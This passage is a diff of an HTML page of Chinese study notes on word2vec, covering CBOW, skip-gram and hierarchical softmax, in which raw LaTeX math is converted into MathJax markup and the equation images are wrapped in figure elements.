+<li><p><strong>隐层到输出层</strong>：隐层的输出为N维向量 <span class="math inline">\(h\)</span> ， 隐层到输出层的权重矩阵为 <span class="math inline">\(W&#39;_{N \times V}\)</span>
+。然后，通过矩阵运算我们得到一个 $V $ 维向量 <span class="math display">\[
+  u = W&#39;^{T} * h
+  \]</span></p></li>
 </ul>
-<p>其中，向量 $u$  的第 $i$  行表示词汇表中第 $i$  个词的可能性，然后我们的目的就是取可能性最高的那个词。<strong>因此，在最后的输出层是一个softmax 层获取分数最高的词</strong>，那么就有我们的最终输出：<br>
-$$<br>
-P(w_j| context)  =y_i =  \frac{exp({u_j})}{\sum_{k \in V} exp({u_k})}<br>
-$$</p>
+<p>其中，向量 <span class="math inline">\(u\)</span> 的第 <span class="math inline">\(i\)</span> 行表示词汇表中第 <span class="math inline">\(i\)</span>
+个词的可能性，然后我们的目的就是取可能性最高的那个词。<strong>因此，在最后的输出层是一个softmax
+层获取分数最高的词</strong>，那么就有我们的最终输出： <span class="math display">\[
+P(w_j| context)  =y_i =  \frac{exp({u_j})}{\sum_{k \in V} exp({u_k})}
+\]</span></p>
 <h4><span id="损失函数">损失函数</span></h4>
-<p>我们假定 $j^*$ 是真实单词在词汇表中的下标，那么根据极大似然法，则目标函数定义如下：<br>
-$$<br>
-E = -log , p(W_O |W_I) = -log , \frac{exp({u_j})}{\sum_{k \in V} exp({u_k})} =  log  \sum_{k \in V} exp(u_{k})  -u_j<br>
-$$</p>
+<p>我们假定 <span class="math inline">\(j^*\)</span>
+是真实单词在词汇表中的下标，那么根据极大似然法，则目标函数定义如下：
+<span class="math display">\[
+E = -log \, p(W_O |W_I) = -log \, \frac{exp({u_j})}{\sum_{k \in V}
+exp({u_k})} =  log  \sum_{k \in V} exp(u_{k})  -u_j
+\]</span></p>
 <h3><span id="12-skip-gram模型">1.2 Skip-gram模型</span></h3>
-<p>Skip-Gram的基本思想是：<strong>通过当前词 $w_t$ 预测其上下文 $w_{t-i}, \cdots , w_{t+i}$</strong> ，模型如下图所示：</p>
-<p><img src="https://pic2.zhimg.com/v2-42ef75691c18a03cfda4fa85a8409e19_b.jpg" alt="img"></p>
+<p>Skip-Gram的基本思想是：<strong>通过当前词 <span class="math inline">\(w_t\)</span> 预测其上下文 <span class="math inline">\(w_{t-i}, \cdots , w_{t+i}\)</span></strong>
+，模型如下图所示：</p>
+<figure>
+<img src="https://pic2.zhimg.com/v2-42ef75691c18a03cfda4fa85a8409e19_b.jpg" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <h4><span id="前向传播过程">前向传播过程</span></h4>
 <ul>
-<li>
-<p><strong>输入层</strong>：   输入的是一个单词，其表示形式为 <strong>One-hot</strong> ，我们将其表示为V维向量 $x_k$ ，其中 $V$ 为词表大小。然后，通过词向量矩阵 $W_{V \times N}$ 我们得到一个N维向量<br>
-$$<br>
-h = W^T * x_k = v^{T}_{w_I}<br>
-$$</p>
-</li>
-<li>
-<p><strong>隐层</strong>： 而隐层中没有激活函数，也就是说输入=输出，因此隐藏的输出也是 $h$ 。</p>
-</li>
-<li>
-<p><strong>隐层到输出层</strong>：</p>
+<li><p><strong>输入层</strong>： 输入的是一个单词，其表示形式为
+<strong>One-hot</strong> ，我们将其表示为V维向量 <span class="math inline">\(x_k\)</span> ，其中 <span class="math inline">\(V\)</span> 为词表大小。然后，通过词向量矩阵 <span class="math inline">\(W_{V \times N}\)</span> 我们得到一个N维向量 <span class="math display">\[
+  h = W^T * x_k = v^{T}_{w_I}
+  \]</span></p></li>
+<li><p><strong>隐层</strong>：
+而隐层中没有激活函数，也就是说输入=输出，因此隐藏的输出也是 <span class="math inline">\(h\)</span> 。</p></li>
+<li><p><strong>隐层到输出层</strong>：</p>
 <ul>
-<li>
-<p><strong>首先</strong>，因为要输出C个单词，因此我们此时的输出有C个分布： <strong>$y_1, \cdots y_C $，且每个分布都是独立的</strong>，我们需要单独计算， 其中 $y_i$  表示窗口的第 $i$  个单词的分布。 【<strong>独立性假设</strong>】</p>
-</li>
-<li>
-<p><strong>其次</strong>， 因为矩阵 $W’<em>{N \times V}$ 是共享的，因此我们得到的 $V \times 1$ 维向量 $u$ 其实是相同的，也就是有 $u</em>{c,j} = u_j$ ，这里 $u$ 的每一行同 CBOW 中一样，表示的也是评分。</p>
-</li>
-<li>
-<p><strong>最后</strong>，每个分布都经过一个 softmax 层，不同于 CBOW，我们此处产生的是第 $i$ 个单词的分布（共有C个单词），如下：</p>
-</li>
+<li><p><strong>首先</strong>，因为要输出C个单词，因此我们此时的输出有C个分布：
+<strong>$y_1, y_C $，且每个分布都是独立的</strong>，我们需要单独计算，
+其中 <span class="math inline">\(y_i\)</span> 表示窗口的第 <span class="math inline">\(i\)</span> 个单词的分布。
+【<strong>独立性假设</strong>】</p></li>
+<li><p><strong>其次</strong>， 因为矩阵 <span class="math inline">\(W&#39;_{N \times V}\)</span>
+是共享的，因此我们得到的 <span class="math inline">\(V \times 1\)</span>
+维向量 <span class="math inline">\(u\)</span> 其实是相同的，也就是有
+<span class="math inline">\(u_{c,j} = u_j\)</span> ，这里 <span class="math inline">\(u\)</span> 的每一行同 CBOW
+中一样，表示的也是评分。</p></li>
+<li><p><strong>最后</strong>，每个分布都经过一个 softmax 层，不同于
+CBOW，我们此处产生的是第 <span class="math inline">\(i\)</span>
+个单词的分布（共有C个单词），如下：</p></li>
 </ul>
-<p>$$<br>
-P(w_{i,j}| context)  =y_i =  \frac{exp({u_j})}{\sum_{k \in V} exp({u_k})}<br>
-$$</p>
-</li>
+<p><span class="math display">\[
+  P(w_{i,j}| context)  =y_i =  \frac{exp({u_j})}{\sum_{k \in V}
+exp({u_k})}
+  \]</span></p></li>
 </ul>
 <h4><span id="损失函数">损失函数</span></h4>
-<p>假设 $j^<em>$ 是真实单词在词汇表中的下标，那么根据<strong>极大似然法</strong>，则目标函数定义如下：<br>
-$$<br>
-\begin{split} E &amp;= - log , p(w_1, w_2, \cdots, w_C | w_I)   \ &amp;= - log \prod_{c=1}^C P(w_c|w_i) \ &amp;= - log  \prod_{c=1}^{C} \frac{exp(u_{c, j})}{\sum_{k=1}^{V} exp(u_{c,k}) } \ &amp;= - \sum_{c=1}^C u_{j^</em><em>c} + C \cdot log \sum</em>{k=1}^{V} exp(u_k) \end{split}<br>
-$$</p>
+<p>假设 <span class="math inline">\(j^*\)</span>
+是真实单词在词汇表中的下标，那么根据<strong>极大似然法</strong>，则目标函数定义如下：
+<span class="math display">\[
+\begin{split} E &amp;= - log \, p(w_1, w_2, \cdots, w_C | w_I)   \\
+&amp;= - log \prod_{c=1}^C P(w_c|w_i) \\ &amp;= - log  \prod_{c=1}^{C}
+\frac{exp(u_{c, j})}{\sum_{k=1}^{V} exp(u_{c,k}) } \\ &amp;= -
+\sum_{c=1}^C u_{j^*_c} + C \cdot log \sum_{k=1}^{V} exp(u_k) \end{split}
+\]</span></p>
 <h2><span id="二-word2vec-优化">二、Word2Vec 优化</span></h2>
 <p>以上我们讨论的模型（二元模型，CBOW和skip-gram）都是他们的原始形式，没有加入任何优化技巧。对于这些模型，每个单词存在两类向量表达：<strong>输入向量</strong><img src="https://www.zhihu.com/equation?tex=v_%7Bw%7D%5E%7B%7D" alt="[公式]">，<strong>输出向量</strong><img src="https://www.zhihu.com/equation?tex=v_%7Bw%7D%5E%7B%27%7D" alt="[公式]">（这也是为什么word2vec的名称由来：1个单词对应2个向量表示)。学习得到输入向量比较简单；但<strong>要学习输出向量是很困难</strong>的。</p>
 <h3><span id="21-hierarchical-softmax">==2.1 Hierarchical Softmax==</span></h3>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/56139075">https://zhuanlan.zhihu.com/p/56139075</a></p>
+<p>https://zhuanlan.zhihu.com/p/56139075</p>
 </blockquote>
-<p>Hierarchical Softmax对原模型的改进主要有两点，第一点是从输入层到隐藏层的映射，没有采用原先的与矩阵W相乘然后相加求平均的方法，而是<strong>直接对所有输入的词向量求和</strong>。假设输入的词向量为（0，1，0，0）和（0,0,0,1），那么隐藏层的向量为（0,1,0,1）。</p>
-<p><strong>Hierarchical Softmax</strong>的第二点改进是采用<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2261635013%22%7D">哈夫曼树</a>来替换了原先的从隐藏层到输出层的矩阵W’。<strong>哈夫曼树的叶节点个数为词汇表的单词个数V</strong>，一个叶节点代表一个单词，而从根节点到该叶节点的路径确定了这个单词最终输出的词向量。</p>
-<img src="https://pic4.zhimg.com/v2-3db7e66f36db0a9e6e6bc2f348dece47_b.jpg" alt="img" style="zoom:50%;">
-<p><strong>具体来说，这棵哈夫曼树除了根结点以外的所有非叶节点中都含有一个由参数θ确定的sigmoid函数，不同节点中的θ不一样</strong>。训练时==<strong>隐藏层的向量</strong>==与这个**==sigmoid函数==**进行运算，根据结果进行分类，若分类为负类则沿左子树向下传递，编码为0；若分类为正类则沿右子树向下传递，编码为1。</p>
-<p><strong>每个叶子节点代表语料库中的一个词</strong>，<strong>于是每个词语都可以被01唯一的编码，并且其编码序列对应一个事件序列，于是我们可以计算条件概率 <img src="https://www.zhihu.com/equation?tex=p%28w+%7C+C+o+n+t+e+x+t%28w%29%29" alt="[公式]"></strong> 。</p>
+<p>Hierarchical
+Softmax对原模型的改进主要有两点，第一点是从输入层到隐藏层的映射，没有采用原先的与矩阵W相乘然后相加求平均的方法，而是<strong>直接对所有输入的词向量求和</strong>。假设输入的词向量为（0，1，0，0）和（0,0,0,1），那么隐藏层的向量为（0,1,0,1）。</p>
+<p><strong>Hierarchical Softmax</strong>的第二点改进是采用<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=哈夫曼树&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2261635013%22%7D">哈夫曼树</a>来替换了原先的从隐藏层到输出层的矩阵W’。<strong>哈夫曼树的叶节点个数为词汇表的单词个数V</strong>，一个叶节点代表一个单词，而从根节点到该叶节点的路径确定了这个单词最终输出的词向量。</p>
+<p><img src="https://pic4.zhimg.com/v2-3db7e66f36db0a9e6e6bc2f348dece47_b.jpg" alt="img" style="zoom:50%;"></p>
+<p><strong>具体来说，这棵哈夫曼树除了根结点以外的所有非叶节点中都含有一个由参数θ确定的sigmoid函数，不同节点中的θ不一样</strong>。训练时==<strong>隐藏层的向量</strong>==与这个<strong>==sigmoid函数==</strong>进行运算，根据结果进行分类，若分类为负类则沿左子树向下传递，编码为0；若分类为正类则沿右子树向下传递，编码为1。</p>
+<p><strong>每个叶子节点代表语料库中的一个词</strong>，<strong>于是每个词语都可以被01唯一的编码，并且其编码序列对应一个事件序列，于是我们可以计算条件概率
+<img src="https://www.zhihu.com/equation?tex=p%28w+%7C+C+o+n+t+e+x+t%28w%29%29" alt="[公式]"></strong> 。</p>
 <p><strong>在开始计算之前，还是得引入一些符号：</strong></p>
-<ol>
-<li>
-<p><img src="https://www.zhihu.com/equation?tex=p%5E%7Bw%7D" alt="[公式]"> :从根结点出发到达w对应叶子结点的路径</p>
-</li>
-<li>
-<p><img src="https://www.zhihu.com/equation?tex=l%5E%7Bw%7D" alt="[公式]"> :路径中包含结点的个数</p>
-</li>
-<li>
-<p><img src="https://www.zhihu.com/equation?tex=p_%7B1%7D%5E%7Bw%7D%2C+p_%7B2%7D%5E%7Bw%7D%2C+%5Ccdots%2C+p_%7Bl%5E%7Bw%7D%7D%5E%7Bw%7D" alt="[公式]"> :路径 <img src="https://www.zhihu.com/equation?tex=p%5E%7Bw%7D" alt="[公式]"> 中的各个节点</p>
-</li>
-<li>
-<p><img src="https://www.zhihu.com/equation?tex=d_%7B2%7D%5E%7Bw%7D%2C+d_%7B3%7D%5E%7Bw%7D%2C+%5Ccdots%2C+d_%7Bl+w%7D%5E%7Bw%7D+%5Cin%5C%7B0%2C1%5C%7D" alt="[公式]"> :词w的编码， <img src="https://www.zhihu.com/equation?tex=d_%7Bj%7D%5E%7Bw%7D" alt="[公式]"> 表示路径 <img src="https://www.zhihu.com/equation?tex=p%5E%7Bw%7D" alt="[公式]"> 第j个节点对应的编码（根节点无编码）</p>
-</li>
-<li>
-<p><img src="https://www.zhihu.com/equation?tex=%5Ctheta_%7B1%7D%5E%7Bw%7D%2C+%5Ctheta_%7B2%7D%5E%7Bw%7D%2C+%5Ccdots%2C+%5Ctheta_%7Bl%5E%7Bw%7D-1%7D%5E%7Bw%7D+%5Cin+%5Cmathbb%7BR%7D%5E%7Bm%7D" alt="[公式]"> :路径 <img src="https://www.zhihu.com/equation?tex=p%5E%7Bw%7D" alt="[公式]"> 中非叶节点对应的<strong>参数向量</strong></p>
-</li>
+<ol type="1">
+<li><p><img src="https://www.zhihu.com/equation?tex=p%5E%7Bw%7D" alt="[公式]"> :从根结点出发到达w对应叶子结点的路径</p></li>
+<li><p><img src="https://www.zhihu.com/equation?tex=l%5E%7Bw%7D" alt="[公式]"> :路径中包含结点的个数</p></li>
+<li><p><img src="https://www.zhihu.com/equation?tex=p_%7B1%7D%5E%7Bw%7D%2C+p_%7B2%7D%5E%7Bw%7D%2C+%5Ccdots%2C+p_%7Bl%5E%7Bw%7D%7D%5E%7Bw%7D" alt="[公式]"> :路径 <img src="https://www.zhihu.com/equation?tex=p%5E%7Bw%7D" alt="[公式]">
+中的各个节点</p></li>
+<li><p><img src="https://www.zhihu.com/equation?tex=d_%7B2%7D%5E%7Bw%7D%2C+d_%7B3%7D%5E%7Bw%7D%2C+%5Ccdots%2C+d_%7Bl+w%7D%5E%7Bw%7D+%5Cin%5C%7B0%2C1%5C%7D" alt="[公式]"> :词w的编码， <img src="https://www.zhihu.com/equation?tex=d_%7Bj%7D%5E%7Bw%7D" alt="[公式]"> 表示路径 <img src="https://www.zhihu.com/equation?tex=p%5E%7Bw%7D" alt="[公式]">
+第j个节点对应的编码（根节点无编码）</p></li>
+<li><p><img src="https://www.zhihu.com/equation?tex=%5Ctheta_%7B1%7D%5E%7Bw%7D%2C+%5Ctheta_%7B2%7D%5E%7Bw%7D%2C+%5Ccdots%2C+%5Ctheta_%7Bl%5E%7Bw%7D-1%7D%5E%7Bw%7D+%5Cin+%5Cmathbb%7BR%7D%5E%7Bm%7D" alt="[公式]"> :路径 <img src="https://www.zhihu.com/equation?tex=p%5E%7Bw%7D" alt="[公式]">
+中非叶节点对应的<strong>参数向量</strong></p></li>
 </ol>
 <p>于是可以给出w的条件概率：</p>
-<p><img src="https://www.zhihu.com/equation?tex=p%28w+%7C+C+o+n+t+e+x+t%28w%29%29%3D%5Cprod_%7Bj%3D2%7D%5E%7Bl%5E%7Bw%7D%7D+p%5Cleft%28d_%7Bj%7D%5E%7Bw%7D+%7C+%5Cmathbf%7Bx%7D_%7Bw%7D%2C+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29" alt="[公式]"></p>
-<p><strong>这是个简单明了的式子，从根节点到叶节点经过了 <img src="https://www.zhihu.com/equation?tex=l%5E%7Bw%7D-1" alt="[公式]"> 个节点，编码从下标2开始（根节点无编码），对应的参数向量下标从1开始（根节点为1)。</strong></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=p%28w+%7C+C+o+n+t+e+x+t%28w%29%29%3D%5Cprod_%7Bj%3D2%7D%5E%7Bl%5E%7Bw%7D%7D+p%5Cleft%28d_%7Bj%7D%5E%7Bw%7D+%7C+%5Cmathbf%7Bx%7D_%7Bw%7D%2C+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
+<p><strong>这是个简单明了的式子，从根节点到叶节点经过了 <img src="https://www.zhihu.com/equation?tex=l%5E%7Bw%7D-1" alt="[公式]">
+个节点，编码从下标2开始（根节点无编码），对应的参数向量下标从1开始（根节点为1)。</strong></p>
 <p>其中，每一项是一个<strong>逻辑斯谛回归</strong>：</p>
-<p><img src="https://www.zhihu.com/equation?tex=p%5Cleft%28d_%7Bj%7D%5E%7Bw%7D+%7C+%5Cmathbf%7Bx%7D_%7Bw%7D%2C+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%3D%5Cleft%5C%7B%5Cbegin%7Barray%7D%7Bll%7D%7B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%2C%7D+%26+%7Bd_%7Bj%7D%5E%7Bw%7D%3D0%7D+%5C%5C+%7B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%2C%7D+%26+%7Bd_%7Bj%7D%5E%7Bw%7D%3D1%7D%5Cend%7Barray%7D%5Cright." alt="[公式]"></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=p%5Cleft%28d_%7Bj%7D%5E%7Bw%7D+%7C+%5Cmathbf%7Bx%7D_%7Bw%7D%2C+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%3D%5Cleft%5C%7B%5Cbegin%7Barray%7D%7Bll%7D%7B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%2C%7D+%26+%7Bd_%7Bj%7D%5E%7Bw%7D%3D0%7D+%5C%5C+%7B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%2C%7D+%26+%7Bd_%7Bj%7D%5E%7Bw%7D%3D1%7D%5Cend%7Barray%7D%5Cright." alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
 <p>考虑到d只有0和1两种取值，我们可以用指数形式方便地将其写到一起：</p>
-<p><img src="https://www.zhihu.com/equation?tex=p%5Cleft%28d_%7Bj%7D%5E%7Bw%7D+%7C+%5Cmathbf%7Bx%7D_%7Bw%7D%2C+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%3D%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5E%7B1-d_%7Bj%7D%5E%7Bw%7D%7D+%5Ccdot%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5E%7Bd%5E%7Bw%7D%7D" alt="[公式]"></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=p%5Cleft%28d_%7Bj%7D%5E%7Bw%7D+%7C+%5Cmathbf%7Bx%7D_%7Bw%7D%2C+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%3D%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5E%7B1-d_%7Bj%7D%5E%7Bw%7D%7D+%5Ccdot%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5E%7Bd%5E%7Bw%7D%7D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
 <p><strong>我们的目标函数取对数似然</strong>：</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%3D%5Csum_%7Bw+%5Cin+%5Cmathcal%7BC%7D%7D+%5Clog+p%28w+%7C+C+o+n+t+e+x+t%28w%29%29" alt="[公式]"></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%3D%5Csum_%7Bw+%5Cin+%5Cmathcal%7BC%7D%7D+%5Clog+p%28w+%7C+C+o+n+t+e+x+t%28w%29%29" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
 <p>将 <img src="https://www.zhihu.com/equation?tex=p%28w+%7C+C+o+n+t+e+x+t%28w%29%29" alt="[公式]"> 代入上式，有:</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%3D%5Csum_%7Bw+%5Cin+%5Cmathcal%7BC%7D%7D+%5Clog+%5Cprod_%7Bj%3D2%7D%5E%7Bl%5E%7Bw%7D%7D%5Cleft%5C%7B%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5E%7B1-d_%7Bj%7D%5E%7Bw%7D%7D+%5Ccdot%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5E%7Bd_%7Bj%7D%5E%7Bw%7D%7D%5Cright%5C%7D" alt="[公式]"></p>
-<p><img src="https://www.zhihu.com/equation?tex=%3D%5Csum_%7Bw+%5Cin+%5Cmathcal%7BC%7D%7D+%5Csum_%7Bj%3D2%7D%5E%7Bl%5E%7Bw%7D%7D%5Cleft%5C%7B%5Cleft%281-d_%7Bj%7D%5E%7Bw%7D%5Cright%29+%5Ccdot+%5Clog+%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%2Bd_%7Bj%7D%5E%7Bw%7D+%5Ccdot+%5Clog+%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5Cright%5C%7D" alt="[公式]"></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%3D%5Csum_%7Bw+%5Cin+%5Cmathcal%7BC%7D%7D+%5Clog+%5Cprod_%7Bj%3D2%7D%5E%7Bl%5E%7Bw%7D%7D%5Cleft%5C%7B%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5E%7B1-d_%7Bj%7D%5E%7Bw%7D%7D+%5Ccdot%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5E%7Bd_%7Bj%7D%5E%7Bw%7D%7D%5Cright%5C%7D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%3D%5Csum_%7Bw+%5Cin+%5Cmathcal%7BC%7D%7D+%5Csum_%7Bj%3D2%7D%5E%7Bl%5E%7Bw%7D%7D%5Cleft%5C%7B%5Cleft%281-d_%7Bj%7D%5E%7Bw%7D%5Cright%29+%5Ccdot+%5Clog+%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%2Bd_%7Bj%7D%5E%7Bw%7D+%5Ccdot+%5Clog+%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5Cright%5C%7D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
 <p>这也很直白，连乘的对数换成求和。不过还是有点长，我们把每一项简记为：</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%28w%2C+j%29%3D%5Cleft%281-d_%7Bj%7D%5E%7Bw%7D%5Cright%29+%5Ccdot+%5Clog+%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%2Bd_%7Bj%7D%5E%7Bw%7D+%5Ccdot+%5Clog+%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D" alt="[公式]"></p>
-<h4><span id="wordvec-极大化化目标函数使用的算法是是随机梯度上升法"><strong><font color="red"> <em>WordVec</em> 极大化化目标函数使用的算法是是随机梯度上升法</font></strong></span></h4>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%28w%2C+j%29%3D%5Cleft%281-d_%7Bj%7D%5E%7Bw%7D%5Cright%29+%5Ccdot+%5Clog+%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%2Bd_%7Bj%7D%5E%7Bw%7D+%5Ccdot+%5Clog+%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
+<h4><span id="wordvec极大化化目标函数使用的算法是是随机梯度上升法"><strong><font color="red">
+<em>WordVec</em>
+极大化化目标函数使用的算法是是随机梯度上升法</font></strong></span></h4>
 <p>每一项有两个参数，一个是每个节点的参数向量 <img src="https://www.zhihu.com/equation?tex=%5Ctheta_%7Bj-1%7D%5E%7Bw%7D" alt="[公式]"> ，另一个是输出层的输入 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BX%7D_%7Bw%7D" alt="[公式]"> ，我们分别对其求偏导数：</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5Cfrac%7B%5Cpartial+%5Cmathcal%7BL%7D%28w%2C+j%29%7D%7B%5Cpartial+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%7D%3D%5Cfrac%7B%5Cpartial%7D%7B%5Cpartial+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%7D%5Cleft%5C%7B%5Cleft%281-d_%7Bj%7D%5E%7Bw%7D%5Cright%29+%5Ccdot+%5Clog+%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%2Bd_%7Bj%7D%5E%7Bw%7D+%5Ccdot+%5Clog+%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5Cright%5C%7D" alt="[公式]"></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Cfrac%7B%5Cpartial+%5Cmathcal%7BL%7D%28w%2C+j%29%7D%7B%5Cpartial+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%7D%3D%5Cfrac%7B%5Cpartial%7D%7B%5Cpartial+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%7D%5Cleft%5C%7B%5Cleft%281-d_%7Bj%7D%5E%7Bw%7D%5Cright%29+%5Ccdot+%5Clog+%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%2Bd_%7Bj%7D%5E%7Bw%7D+%5Ccdot+%5Clog+%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%5Cright%5C%7D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
 <p>因为sigmoid函数的导数有个很棒的形式：</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5Csigma%5E%7B%5Cprime%7D%28x%29%3D%5Csigma%28x%29%5B1-%5Csigma%28x%29%5D" alt="[公式]"></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Csigma%5E%7B%5Cprime%7D%28x%29%3D%5Csigma%28x%29%5B1-%5Csigma%28x%29%5D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
 <p>于是代入上上式得到：</p>
